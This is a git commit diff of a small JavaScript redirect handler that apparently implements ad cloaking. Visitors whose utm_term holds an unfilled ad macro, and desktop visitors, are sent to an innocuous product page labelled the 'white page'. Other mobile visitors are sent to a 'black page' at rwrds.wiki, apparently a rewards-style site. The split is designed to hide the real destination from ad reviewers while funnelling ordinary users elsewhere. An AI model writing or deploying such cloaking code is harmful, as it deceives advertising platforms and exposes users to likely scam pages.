e7ab129eaf05e2c48ed2fcc04a6e72ad0d65b66e
Ayden Xu <aydenxunc@gmail.com>
2024-12-26 11:31:27 -0500

    newert

--- api/redirect.js
+++ api/redirect.js
@@ -1,28 +1,27 @@
-export default function handler(req, res) {
+  export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.japanla.com/products/tasty-peach-neon-lollipop-nomwhal";
     const blackPageURL = "https://rwrds.wiki";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
-    const utmCampaign = queryParams.get('utm_campaign');
+    const utmTerm = queryParams.get('utm_term');
   
     // Get the User-Agent from the request headers
     const userAgent = req.headers['user-agent'] || '';
     const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
   
     // Redirection logic
-    if (utmCampaign && utmCampaign.length > 0) {
-      // UTM campaign 'l1' takes priority for both desktop and mobile
-      res.writeHead(302, { Location: whitePageURL });
+    if (utmTerm === '__AID_NAME__') {
+        // If utm_term matches __AID_NAME__ exactly
+        res.writeHead(302, { Location: whitePageURL });
     } else if (isMobileDevice) {
-      // Mobile devices without 'l1' campaign
-      res.writeHead(302, { Location: blackPageURL });
+        // Mobile devices without matching parameters
+        res.writeHead(302, { Location: blackPageURL });
     } else {
-      // Desktop devices without 'l1' campaign
-      res.writeHead(302, { Location: whitePageURL });
+        // Desktop devices without matching parameters
+        res.writeHead(302, { Location: whitePageURL });
     }
   
     res.end();
-  }
-  
+}
